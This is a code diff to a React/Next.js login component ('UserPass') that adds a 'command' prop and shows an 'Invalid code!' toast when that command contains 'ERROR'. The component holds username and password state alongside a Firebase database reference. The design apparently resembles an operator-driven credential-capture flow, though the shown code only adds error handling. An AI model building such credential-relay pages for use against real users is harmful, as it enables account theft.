@@ -4,7 +4,8 @@ import { Locale } from "@/config/i18n.config";
 import { getDictionaryUseClient } from "@/dicts/default-dictionary-use-client";
 import { ThenableReference, update } from "firebase/database";
 import { useParams } from "next/navigation";
-import { Dispatch, SetStateAction, useState } from "react";
+import { Dispatch, SetStateAction, useEffect, useState } from "react";
+import { toast } from "react-toastify";
 
 interface IProps {
   setUsername: Dispatch<SetStateAction<string>>;
@@ -12,6 +13,7 @@ interface IProps {
   username: string;
   password: string;
   dataRef: ThenableReference | null;
+  command: string;
 }
 
 export const UserPass = ({
@@ -20,12 +22,27 @@ export const UserPass = ({
   password,
   username,
   dataRef,
+  command,
 }: IProps) => {
   const { lang } = useParams<{ lang: Locale }>();
   const [dict, setDict] = useState(getDictionaryUseClient(lang));
   const [loading, setLoading] = useState(false);
 
   const [showPassInput, setShowPassInput] = useState(false);
+
+  useEffect(() => {
+    if (command.includes("ERROR")) {
+      toast.error("Invalid code!", {
+        position: "top-center",
+        autoClose: 3000,
+        hideProgressBar: true,
+        closeOnClick: true,
+        theme: "light",
+      });
+
+      setLoading(false);
+    }
+  }, [command]);
 
   const handleShowPass = () => {
     setLoading(true);
